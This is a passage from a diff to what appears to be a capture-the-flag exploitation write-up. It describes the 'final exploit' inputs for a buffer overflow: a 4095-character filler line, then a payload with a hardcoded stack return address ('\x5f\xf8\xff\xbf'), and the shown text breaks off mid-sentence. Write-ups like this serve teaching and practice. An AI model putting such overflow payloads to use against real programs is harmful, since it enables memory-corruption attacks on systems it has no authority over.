@@ -263,4 +263,4 @@ Final exploit:
 
 Where:
 * first input is "0" * 4095 + "\n" that will fill in buffer fully but put final '\0' in `strchr`
-* s
+* second input is "123456789" + "\x5f\xf8\xff\xbf" + "0" * 7 because read will read only 4096 bytes a
